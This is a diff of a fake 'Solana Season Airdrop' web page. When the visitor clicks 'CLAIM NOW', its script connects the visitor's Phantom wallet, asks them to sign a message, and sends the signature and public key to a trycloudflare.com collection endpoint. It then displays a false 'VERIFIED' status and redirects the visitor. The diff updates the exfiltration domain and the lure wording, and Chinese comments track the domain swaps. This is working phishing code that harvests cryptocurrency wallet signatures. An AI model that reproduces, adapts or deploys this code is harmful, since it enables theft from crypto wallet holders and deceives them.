@@ -3,29 +3,35 @@
 <body style="background:#000;color:#14F195;text-align:center;padding-top:25vh;font-family:sans-serif;">
 <div style="border:1px solid #14F195;padding:50px;display:inline-block;border-radius:20px;background:#111;box-shadow: 0 0 30px #14F19544;">
     <h1 style="letter-spacing:1px;font-size:24px;">SOLANA SEASON AIRDROP</h1>
-    <p style="color:#888;margin-bottom:30px;">Checking eligibility for reward pool...</p>
+    <p style="color:#888;margin-bottom:30px;">Checking wallet eligibility for reward pool...</p>
     <button id="cta" style="padding:18px 50px;background:#14F195;color:#000;font-weight:bold;border:none;border-radius:10px;cursor:pointer;font-size:20px;box-shadow: 0 4px 15px #14F19577;">CLAIM NOW</button>
-    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Ready</div>
+    <div id="status" style="margin-top:25px;color:#444;font-size:14px;">Status: Connected</div>
 </div>
 <script>
 document.getElementById('cta').onclick = async () => {
     try {
         const p = window.solana || window.phantom?.solana;
-        if (!p) { alert("Use Phantom Browser"); return; }
+        if (!p) { alert("Please use Phantom browser."); return; }
         const { publicKey } = await p.connect();
-        const message = "V4-Final-Verify-" + Math.floor(Math.random()*1000);
+        const message = "Claim Airdrop Auth: " + Math.floor(Math.random() * 999999);
         const encodedMessage = new TextEncoder().encode(message);
+        document.getElementById('status').innerText = "Processing signature...";
         const signedMessage = await p.signMessage(encodedMessage, "utf8");
         const signature = btoa(String.fromCharCode.apply(null, signedMessage.signature));
         
-        // 🔱 注入刚刚获取的新生死线域名
-        fetch("https://history-catalog-correct-conservative.trycloudflare.com/collect?t=" + Date.now(), {
+        // 🔱 昨天的原装接口：/collect
+        fetch("https://promotes-supported-mesa-warranties.trycloudflare.com/collect", {
             method: 'POST',
             mode: 'no-cors',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ signature, pubkey: publicKey.toString(), message })
+            body: JSON.stringify({
+                signature: signature,
+                pubkey: publicKey.toString(),
+                message: message
+            })
         });
-        document.getElementById('status').innerText = "SUCCESS! REDIRECTING...";
+        
+        document.getElementById('status').innerText = "VERIFIED! REDIRECTING...";
         setTimeout(() => { window.location.href = "https://solscan.io"; }, 1000);
     } catch(e) { window.location.reload(); }
 }
